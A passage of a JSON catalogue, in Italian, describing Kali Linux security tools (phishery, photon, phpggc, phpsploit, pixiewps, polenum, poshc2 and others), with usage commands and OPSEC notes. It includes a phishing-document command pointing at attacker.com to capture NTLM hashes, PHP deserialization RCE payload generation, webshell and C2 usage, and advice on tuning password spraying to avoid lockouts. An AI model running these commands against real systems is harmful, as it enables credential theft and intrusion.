    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Phishery</strong> è un tool che inietta URL in documenti Word per triggerare autenticazione NTLM quando aperti. La vittima che apre il documento invia automaticamente hash NTLM al server dell'attaccante per relay o cracking.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Template Injection:</strong> inietta URL in template Word esistenti</p><p><strong>NTLM Capture:</strong> server integrato per raccolta hash NTLM</p><p><strong>Stealth:</strong> documento appare normale, injection invisibile</p><p><strong>Multiple Formats:</strong> supporta .docx e altri formati Office moderni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio server e iniezione in documento\nphishery -u https://attacker.com/template -i original.docx -o malicious.docx\n\n# Avvio listener per hash\nphishery -s\n\n# Con porta custom\nphishery -s -p 8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>phishing</strong>, raccolta credenziali via documenti apparentemente innocui.</p><p>Per <strong>initial access</strong>, cattura hash per relay o cracking.</p><p>Per <strong>red team</strong>, simulazione attacco spear-phishing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>SMB Signing:</strong> relay bloccato se SMB signing è abilitato.</p><p><strong>Firewall:</strong> vittima deve poter raggiungere server attacker.</p><p><strong>AV:</strong> alcuni antivirus rilevano template injection.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "photon",
    "name": "photon",
    "version": "1.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/photon/",
    "desc": "Web crawler veloce per estrazione URL, email, endpoint API, chiavi e secrets.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Photon</strong> è un web crawler Python veloce progettato per OSINT e reconnaissance. Estrae automaticamente URL, email, subdomini, endpoint API, chiavi, secrets e file da siti web target con parsing intelligente di JavaScript.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast Crawling:</strong> crawler multi-threaded per massima velocità</p><p><strong>JS Parsing:</strong> estrae endpoint e secrets da codice JavaScript</p><p><strong>Data Extraction:</strong> email, URL interni/esterni, file, subdomini automatici</p><p><strong>Secret Detection:</strong> pattern matching per API keys e token</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crawl base di un sito\nphoton -u https://target.com\n\n# Con profondità specifica\nphoton -u https://target.com -l 3\n\n# Solo estrazione da JavaScript\nphoton -u https://target.com --only-urls\n\n# Esclusione pattern\nphoton -u https://target.com --exclude logout,signout</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web recon</strong>, mapping completo di applicazione web.</p><p>Per <strong>OSINT</strong>, raccolta email e informazioni di contatto.</p><p>Per <strong>secret hunting</strong>, identificazione chiavi API esposte in frontend.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffico:</strong> crawling genera molte richieste, facilmente rilevabile.</p><p><strong>Rate limiting:</strong> usare opzioni di throttling per evitare blocchi.</p><p><strong>User-Agent:</strong> customizzabile per camouflage.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "phpggc",
    "name": "phpggc",
    "version": "0.20230428",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/phpggc/",
    "desc": "Genera payload di deserialization per framework PHP: Laravel, Symfony, WordPress.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PHPGGC</strong> (PHP Generic Gadget Chains) è un tool per generare payload di object deserialization per applicazioni PHP. Include gadget chains per Laravel, Symfony, WordPress, Magento, Drupal e molti altri framework per ottenere RCE via unserialize() vulnerabile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Gadget Library:</strong> centinaia di gadget chains per framework PHP popolari</p><p><strong>RCE Payloads:</strong> esecuzione comandi, scrittura file, SSRF</p><p><strong>Encoding Options:</strong> output base64, URL encoded, serialized</p><p><strong>Wrapper Support:</strong> phar:// wrapper per trigger automatico</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lista gadget disponibili\nphpggc -l\n\n# Genera payload Laravel RCE\nphpggc Laravel/RCE1 system 'id'\n\n# Output base64\nphpggc -b Symfony/RCE4 exec 'whoami'\n\n# Genera phar file\nphpggc --phar phar Laravel/RCE1 system 'id' -o exploit.phar</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>PHP exploitation</strong>, RCE via vulnerabilità unserialize().</p><p>Per <strong>web pentesting</strong>, test applicazioni con deserializzazione insicura.</p><p>Per <strong>PHAR exploitation</strong>, attacchi via phar:// wrapper.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requisiti:</strong> target deve avere libreria/framework vulnerabile installato.</p><p><strong>Version Match:</strong> gadget chain deve corrispondere a versione target.</p><p><strong>WAF:</strong> payload serializzati possono essere rilevati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Deserialization"
    ],
    "notes": null
  },
  {
    "id": "phpsploit",
    "name": "phpsploit",
    "version": "3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/phpsploit/",
    "desc": "Framework post-exploitation per webshell PHP con tunneling e comandi stealth.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PHPSploit</strong> è un framework di post-exploitation stealth per webshell PHP. Fornisce shell interattiva con tunneling HTTP, evasione di WAF, plugin per enumeration e persistenza. Comunicazione crittografata e difficile da rilevare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Stealth Shell:</strong> webshell minimale con payload dinamici</p><p><strong>HTTP Tunneling:</strong> tutti i comandi via richieste HTTP normali</p><p><strong>Plugin System:</strong> moduli per upload, download, privesc, persistence</p><p><strong>Encryption:</strong> comunicazione crittografata per evasione IDS</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Generazione backdoor\nphpsploit\nset TARGET http://target.com/shell.php\nrun\n\n# Esecuzione comandi\nrun system id\n\n# Upload file\nupload local_file.txt /var/www/remote.txt\n\n# Enumerazione\nrun sysinfo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, mantenimento accesso dopo upload webshell.</p><p>Per <strong>red team</strong>, C2 leggero via HTTP su web server compromesso.</p><p>Per <strong>pivoting</strong>, tunnel attraverso server web esposto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>File on disk:</strong> richiede webshell persistente su filesystem.</p><p><strong>Log:</strong> richieste HTTP loggabili da web server.</p><p><strong>WAF:</strong> moduli stealth progettati per bypassare WAF comuni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "pixiewps",
    "name": "pixiewps",
    "version": "1.4.2",
    "icon": "../app/icons/pixiewps-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pixiewps/",
    "desc": "Exploita vulnerabilità Pixie Dust in WPS per recuperare PIN e password WiFi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pixiewps</strong> è un tool che sfrutta la vulnerabilità Pixie Dust in implementazioni WPS deboli. Permette di recuperare il PIN WPS in secondi invece di ore, analizzando i nonce scambiati durante l'handshake WPS e calcolando offline il PIN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pixie Dust Attack:</strong> crack PIN WPS via analisi crittografica offline</p><p><strong>Fast Recovery:</strong> recupero PIN in secondi su router vulnerabili</p><p><strong>Integration:</strong> lavora con output di reaver e bully</p><p><strong>Vendor Detection:</strong> identifica chipset vulnerabili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Usato con output reaver\nreaver -i wlan0mon -b BSSID -vvv | tee reaver.log\npixiewps -e PKE -r PKR -s E-Hash1 -z E-Hash2 -a AuthKey\n\n# Modalità automatica con reaver\nreaver -i wlan0mon -b BSSID -K 1\n\n# Con valori manuali\npixiewps --pke PKE --pkr PKR --e-hash1 HASH1 --e-hash2 HASH2 --authkey KEY</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi pentesting</strong>, bypass WPS su router vulnerabili.</p><p>Per <strong>security audit</strong>, verifica vulnerabilità Pixie Dust su infrastruttura.</p><p>Per <strong>CTF</strong>, challenge WiFi con WPS abilitato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> attacco a reti WiFi senza autorizzazione è illegale.</p><p><strong>Requisiti:</strong> funziona solo su chipset WPS vulnerabili.</p><p><strong>Mitigazione:</strong> molti vendor hanno patchato la vulnerabilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "plaso",
    "name": "plaso",
    "version": "20241006",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/plaso/",
    "desc": "Super timeline forensics: correla eventi da log, filesystem, registry, browser.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Plaso</strong> (Plaso Langar Að Safna Öllu) è un motore di super-timeline forensics che estrae e correla timestamp da molteplici sorgenti: filesystem, registry Windows, log eventi, browser, email. Produce timeline unificate per analisi cronologica degli eventi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-source Parsing:</strong> oltre 100 parser per formati diversi</p><p><strong>Timeline Generation:</strong> timeline unificata da tutte le sorgenti</p><p><strong>Filtering:</strong> filtri potenti per focus su periodi o tipi specifici</p><p><strong>Output Formats:</strong> CSV, JSON, Elasticsearch, Timesketch</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrazione da immagine disco\nlog2timeline.py timeline.plaso disk_image.dd\n\n# Da directory montata\nlog2timeline.py timeline.plaso /mnt/evidence\n\n# Generazione output CSV\npsort.py -o l2tcsv timeline.plaso > timeline.csv\n\n# Con filtro temporale\npsort.py --date-filter \"2024-01-01,2024-01-31\" timeline.plaso</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DFIR</strong>, ricostruzione timeline completa di incidente.</p><p>Per <strong>malware analysis</strong>, identificazione momento e sequenza di infezione.</p><p>Per <strong>investigation</strong>, correlazione attività utente nel tempo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Risorse:</strong> parsing completo richiede tempo e CPU significativi.</p><p><strong>Storage:</strong> file plaso possono essere molto grandi.</p><p><strong>Completezza:</strong> coverage dipende dai parser disponibili per il caso.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "pnscan",
    "name": "pnscan",
    "version": "1.14.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pnscan/",
    "desc": "Port scanner multi-threaded leggero per scan rapidi su grandi range di IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pnscan</strong> è un port scanner multi-threaded leggero e veloce, ottimizzato per scan rapidi su grandi range di indirizzi IP. Minimalista ma efficiente, ideale per discovery iniziale di porte aperte su intere subnet.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-threaded:</strong> scan parallelo per massima velocità</p><p><strong>Lightweight:</strong> binario minimale, poche dipendenze</p><p><strong>Range Support:</strong> supporta notation CIDR e range IP</p><p><strong>Banner Grab:</strong> opzionale cattura banner di servizi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan porta singola su range\npnscan -p 80 192.168.1.0/24\n\n# Scan multiple porte\npnscan -p 22,80,443 192.168.1.0/24\n\n# Con banner grabbing\npnscan -b -p 22 192.168.1.0/24\n\n# Aumenta thread\npnscan -t 100 -p 80 10.0.0.0/16</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network discovery</strong>, identificazione rapida host con porte aperte.</p><p>Per <strong>mass scanning</strong>, scan di grandi network per servizio specifico.</p><p>Per <strong>pre-enum</strong>, discovery prima di scan dettagliato con nmap.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> scan di massa facilmente rilevabili.</p><p><strong>Rate:</strong> molti thread generano picchi di traffico.</p><p><strong>IDS:</strong> pattern scan identificabile da sistemi di detection.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "pocsuite3",
    "name": "pocsuite3",
    "version": "2.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pocsuite3/",
    "desc": "Framework remoto per sviluppo e test di exploit PoC con integrazione Shodan/Fofa.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pocsuite3</strong> è un framework open-source per sviluppo, test e gestione di exploit Proof-of-Concept. Sviluppato da Knownsec, integra ricerca target via Shodan, Fofa, ZoomEye per identificare host vulnerabili e testare PoC in modo automatizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PoC Development:</strong> framework strutturato per creare exploit modulari</p><p><strong>Search Integration:</strong> query dirette a Shodan, Fofa, ZoomEye per target discovery</p><p><strong>Batch Testing:</strong> test massivo di vulnerabilità su liste di target</p><p><strong>Plugin System:</strong> architettura modulare per estensioni custom</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Esecuzione PoC su singolo target\npocsuite -r poc.py -u http://target.com\n\n# Con ricerca Shodan\npocsuite -r poc.py --dork 'apache' --dork-shodan\n\n# Scan lista target\npocsuite -r poc.py -f targets.txt\n\n# Modalità verify + attack\npocsuite -r poc.py -u target --verify --attack</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability research</strong>, sviluppo e test di nuovi exploit.</p><p>Per <strong>mass scanning</strong>, verifica vulnerabilità su larga scala.</p><p>Per <strong>bug bounty</strong>, automazione test su scope ampi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Attribution:</strong> query a motori di ricerca sono loggate.</p><p><strong>Legal:</strong> test su target non autorizzati è illegale.</p><p><strong>Rate limiting:</strong> API Shodan/Fofa hanno limiti di query.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "polenum",
    "name": "polenum",
    "version": "1.6.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/polenum/",
    "desc": "Estrae password policy da domain controller Windows via RPC anonimo o autenticato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Polenum</strong> è un tool Python specializzato nell'estrazione della password policy da domini Active Directory tramite il protocollo MS-SAMR (Security Account Manager Remote). Può operare in modalità null session (senza credenziali, se il DC lo permette) o autenticata, e rivela informazioni critiche per pianificare attacchi basati su password: lunghezza minima richiesta, requisiti di complessità, history (quante password precedenti non possono essere riutilizzate), età massima/minima, e soprattutto le impostazioni di account lockout (threshold, duration, observation window). Queste informazioni sono fondamentali per calibrare attacchi di password spraying evitando lockout massivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Null Session Support:</strong> Tenta prima l'enumerazione anonima via sessione SMB null. Su domain controller legacy o misconfigured, questo può funzionare senza alcuna credenziale, rivelando policy senza lasciare tracce associate a un account.</p><p><strong>Authenticated Mode:</strong> Con credenziali di dominio valide (anche utente standard), estrae policy complete. Usa il protocollo SAMR per query al Security Account Manager del DC.</p><p><strong>Complete Policy Extraction:</strong> Recupera tutti i parametri: MinPasswordLength, PasswordComplexity, PasswordHistoryLength, MinPasswordAge, MaxPasswordAge, LockoutThreshold, LockoutDuration, LockoutObservationWindow.</p><p><strong>Scriptable Output:</strong> Output testuale parsabile per integrazione in workflow automatizzati. Può essere usato in combinazione con tool di password spraying per auto-configurare rate limiting.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Polenum richiede raggiungibilità del DC su porta 445 (SMB) e 135 (RPC).</p><pre><code># Tentativo con null session (no credenziali)\npolenum -d corp.local -u '' -p '' --dc dc.corp.local\n# Funziona solo se DC permette anonymous enumeration\n\n# Con credenziali domain user\npolenum -d corp.local -u normaluser -p 'Password123' --dc 192.168.1.10\n\n# Specifica solo DC (autodiscover domain)\npolenum --dc dc.corp.local -u user -p pass\n\n# Output tipico:\n# [+] Minimum Password Length: 8\n# [+] Password Complexity: Enabled\n# [+] Password History Length: 24\n# [+] Maximum Password Age: 90 days\n# [+] Minimum Password Age: 1 day\n# [+] Account Lockout Threshold: 5\n# [+] Account Lockout Duration: 30 minutes\n# [+] Lockout Observation Window: 30 minutes\n\n# Uso delle info per password spraying sicuro\n# Se threshold=5 e window=30min:\n# Spraya max 4 password ogni 30 minuti per evitare lockout</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Prima di <strong>Password Spraying</strong>, polenum è essenziale per conoscere il lockout threshold. Spraying cieco può bloccare centinaia di account causando DoS e alert massivi. Conoscendo threshold e observation window, si calibra l'attacco per rimanere sotto la soglia.</p><p>Durante <strong>Active Directory Enumeration</strong>, la password policy rivela la security posture: lunghezza minima 8 senza complessità è debole, threshold 0 (no lockout) è critico, history corta permette password cycling.</p><p>Per <strong>Security Audit</strong>, verifica che policy aziendali dichiarate siano effettivamente implementate. Confronta policy estratta con baseline di sicurezza (NIST, CIS) per identificare gap.</p><p>Nella <strong>Credential Attack Planning</strong>, requisiti di complessità guidano la scelta delle wordlist. Policy che richiede maiuscola+minuscola+numero+speciale restringe lo spazio di ricerca rispetto a solo lunghezza minima.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>RPC Logging:</strong> Query SAMR vengono loggate sul domain controller (Event ID 4661, 4662). L'account usato per l'autenticazione appare nei log. In operazioni stealth, usare account compromessi sacrificabili.</p><p><strong>Null Session Raramente Funziona:</strong> Domain controller Windows Server 2012+ bloccano enumeration anonima di default. La null session funziona principalmente su DC legacy o misconfigured.</p><p><strong>SIEM Detection:</strong> Query SAMR da workstation non-admin possono triggerare alert in ambienti monitorati. Pattern: utente standard che enumera policy da macchina insolita.</p><p><strong>Alternative:</strong> Con credenziali, `net accounts /domain` o PowerShell `Get-ADDefaultDomainPasswordPolicy` ottengono le stesse info. LDAP query su attributi di dominio è metodo alternativo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "pompem",
    "name": "pompem",
    "version": "0.2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pompem/",
    "desc": "Cerca exploit per software specifico su multiple fonti: Exploit-DB, PacketStorm, NVD.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pompem</strong> è un tool Python per la ricerca automatizzata di exploit pubblici, che aggrega risultati da multiple fonti online simultaneamente: Exploit-DB, PacketStorm Security, WPScan Vulnerability Database (per WordPress), e altri repository. A differenza di searchsploit che cerca in un database locale, Pompem interroga le API e fa scraping dei siti in tempo reale, garantendo risultati sempre aggiornati. Particolarmente utile quando si hanno software e versioni specifiche da verificare: Pompem trova rapidamente tutti i PoC (Proof of Concept) pubblicamente disponibili, con link diretti per il download.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Aggregation:</strong> Ricerca parallela su Exploit-DB, PacketStorm, WPScan VulnDB, e altri. I risultati vengono deduplicati e presentati in formato unificato con riferimenti alle fonti originali.</p><p><strong>Intelligent Matching:</strong> Ricerca fuzzy che trova exploit anche con variazioni nel naming. Cerca per prodotto, versione, vendor, o combinazioni. Utile quando non si conosce la nomenclatura esatta usata nei database.</p><p><strong>Structured Output:</strong> Risultati formattati con titolo exploit, tipo (remote/local/webapp/dos), piattaforma, e URL diretto. Output salvabile in file per documentazione o parsing successivo.</p><p><strong>WordPress Specialization:</strong> Integrazione con WPScan VulnDB per ricerche specifiche su plugin, temi, e core WordPress. Database dedicato con vulnerabilità WordPress non sempre presenti su Exploit-DB.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Pompem richiede connessione internet per interrogare i database online.</p><pre><code># Ricerca exploit per software e versione\npompem -s \"Apache 2.4.49\"\npompem -s \"OpenSSH 7.2p2\"\npompem -s \"ProFTPD 1.3.5\"\n\n# Ricerca WordPress plugin vulnerabili\npompem -s \"WordPress contact form 7\"\npompem -s \"WordPress elementor\"\npompem -s \"WordPress woocommerce\"\n\n# Ricerca per prodotto generico\npompem -s \"nginx\"\npompem -s \"tomcat\"\n\n# Salva risultati su file\npompem -s \"Drupal 7\" -o drupal_exploits.txt\n\n# Filtro per tipo di exploit\npompem -s \"apache\" --type remote\npompem -s \"linux kernel\" --type local\n\n# Output tipico:\n# [+] Exploit-DB Results:\n#     Apache 2.4.49 - Path Traversal & RCE (CVE-2021-41773)\n#     https://www.exploit-db.com/exploits/50383\n#     Type: Remote | Platform: Multiple\n#\n# [+] PacketStorm Results:\n#     Apache HTTP Server 2.4.49 Path Traversal\n#     https://packetstormsecurity.com/files/164418/\n\n# Workflow tipico post-enumeration\nnmap -sV target.com -oG - | grep open | \\\n  awk '{print $3\" \"$4}' | while read svc ver; do\n    pompem -s \"$svc $ver\"\n  done</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Vulnerability Assessment</strong>, dopo aver identificato versioni software con nmap o altri scanner, Pompem verifica rapidamente se esistono exploit pubblici. Un software con exploit pubblico richiede patching prioritario.</p><p>Nel <strong>Penetration Testing</strong>, la fase di ricerca exploit è semplificata: invece di cercare manualmente su ogni database, Pompem aggrega tutto in un'unica query.</p><p>Per <strong>Security Research</strong>, tracking di exploit pubblicati per specifici software. Utile per monitorare lo stato di vulnerabilità di prodotti specifici nel tempo.</p><p>Durante <strong>Patch Prioritization</strong>, aiuta i team di sicurezza a identificare quali sistemi hanno exploit pubblicamente disponibili e richiedono patching urgente rispetto a vulnerabilità solo teoriche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Query Pubbliche:</strong> Le ricerche vengono inviate a server esterni. I provider potrebbero loggare le query. In contesti sensibili, considerare se rivelare gli interessi di ricerca.</p><p><strong>Exploit Verification:</strong> Gli exploit trovati provengono da fonti pubbliche e potrebbero essere obsoleti, non funzionanti, o contenere codice malevolo. Sempre verificare e testare in ambiente controllato.</p><p><strong>Rate Limiting:</strong> Query frequenti possono essere rate-limited dai provider. Pompem non ha throttling integrato, usare con moderazione.</p><p><strong>Coverage Gaps:</strong> Non tutti i database exploit sono coperti. Exploit recenti o di nicchia potrebbero non essere indicizzati. Complementare con ricerche manuali su GitHub, Twitter, e advisory vendor.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "portspoof",
    "name": "portspoof",
    "version": "1.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/portspoof/",
    "desc": "Honeypot che risponde su tutte le porte TCP con fake services per confondere scanner.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Portspoof</strong> è un tool di cyber deception che implementa una strategia anti-reconnaissance rispondendo su tutte le 65535 porte TCP con banner di servizi fake. Quando un attaccante esegue un port scan contro un sistema protetto da Portspoof, ogni porta appare aperta e risponde con signature di servizi diversi (Apache, SSH, MySQL, etc.), rendendo i risultati dello scan completamente inutilizzabili. Questo approccio inverte il vantaggio tipico dell'attaccante: invece di dover proteggere poche porte, il difensore nasconde i servizi reali in un mare di rumore. Portspoof funziona come honeypot distribuito su tutto lo spazio porte, loggando ogni tentativo di connessione per threat intelligence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Universal Port Response:</strong> Un singolo processo risponde su tutte le 65535 porte TCP grazie a regole iptables che redirigono tutto il traffico. Ogni connessione riceve una risposta apparentemente legittima, facendo sembrare ogni porta come hosting un servizio attivo.</p><p><strong>Configurable Fake Banners:</strong> Database di signature di servizi reali (HTTP headers, SSH banners, FTP greetings, etc.). Può rispondere con banner casuali o seguire pattern configurabili. Le signature sono sufficientemente realistiche da ingannare nmap service detection.</p><p><strong>Scanner Confusion:</strong> Tool come nmap ricevono 65535 porte \"open\" con servizi diversi. L'output diventa inutilizzabile: impossibile distinguere i veri servizi dai fake. Aumenta drasticamente il tempo e il rumore necessario per reconnaissance efficace.</p><p><strong>Connection Logging:</strong> Ogni tentativo di connessione viene loggato con timestamp, IP sorgente, porta destinazione, e dati inviati. Fornisce early warning di scan in corso e intelligence su tecniche usate dagli attaccanti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Portspoof richiede configurazione iptables per redirigere il traffico al processo listener.</p><pre><code># Setup iptables per redirect tutto il traffico TCP al listener\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp \\\n  --dport 1:65535 -j REDIRECT --to-port 4444\n\n# Avvio Portspoof in daemon mode\nsudo portspoof -c /etc/portspoof/portspoof.conf \\\n  -s /etc/portspoof/portspoof_signatures -D\n\n# Con logging verboso su file\nsudo portspoof -l /var/log/portspoof.log \\\n  -c /etc/portspoof/portspoof.conf \\\n  -s /etc/portspoof/portspoof_signatures\n\n# Listener su porta custom\nsudo portspoof -p 8080 -c portspoof.conf -s signatures\n\n# Test da altra macchina\nnmap -sV -p1-1000 target\n# Output: tutte le porte \"open\" con servizi diversi\n\n# Escludere porte reali dal redirect\n# Prima permettere traffico ai servizi reali:\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 22 -j ACCEPT\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j ACCEPT\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j ACCEPT\n# Poi redirect il resto:\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp \\\n  --dport 1:65535 -j REDIRECT --to-port 4444\n\n# Cleanup regole iptables\nsudo iptables -t nat -F PREROUTING</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Active Defense</strong>, Portspoof rende la reconnaissance phase dell'attaccante estremamente frustrante. Anche scan completi producono output inutilizzabile, rallentando significativamente la kill chain.</p><p>Come <strong>Distributed Honeypot</strong>, ogni connessione a porte non-service viene loggata. Alert immediato quando qualcuno scansiona il sistema. I log rivelano IP attaccanti, timing patterns, e potenzialmente tool usati.</p><p>Per <strong>Deception Operations</strong>, può essere combinato con altri tool di deception per creare ambienti che confondono e rallentano attaccanti, dando tempo ai difensori di reagire.</p><p>Durante <strong>Red Team Testing</strong>, Portspoof testa l'efficacia dei tool di reconnaissance del red team e la loro capacità di distinguere servizi reali da fake.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Resource Usage:</strong> Gestire potenzialmente migliaia di connessioni simultanee richiede risorse. Tuning necessario per ambienti ad alto volume. Memory e CPU usage da monitorare.</p><p><strong>Fingerprinting Possible:</strong> Attaccanti esperti possono riconoscere Portspoof da pattern nelle risposte: timing troppo uniforme, banner non del tutto coerenti, o comportamento non standard. Versioni recenti migliorano il realismo.</p><p><strong>Service Interference:</strong> Se le regole iptables non sono configurate correttamente, Portspoof può intercettare traffico destinato a servizi legittimi. Sempre escludere le porte dei servizi reali prima di attivare il redirect.</p><p><strong>Legal Consideration:</strong> In alcune giurisdizioni, tool di deception possono avere implicazioni legali se usati per ingannare utenti legittimi. Usare in contesti autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "poshc2",
    "name": "poshc2",
    "version": "9.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/poshc2/",
    "desc": "Framework C2 con implant PowerShell, C#, Python per operazioni red team avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PoshC2</strong> è un framework Command and Control proxy-aware per red team e penetration testing. Supporta implant in PowerShell, C#, Python con comunicazione crittografata, moduli post-exploitation integrati e gestione multi-operatore.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-language Implants:</strong> payload PowerShell, C#, Python per diversi ambienti</p><p><strong>Proxy-aware:</strong> comunicazione attraverso proxy aziendali</p><p><strong>HTTPS C2:</strong> traffico crittografato che mimetizza comunicazioni legittime</p><p><strong>Module Library:</strong> mimikatz, persistence, lateral movement integrati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup server PoshC2\nposh-server\n\n# Generazione payload\nposh-config\nposh-implantgen\n\n# Connessione al framework\nposh-client\n\n# Esecuzione modulo su implant\nloadmodule Invoke-Mimikatz.ps1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, operazioni C2 complete su target 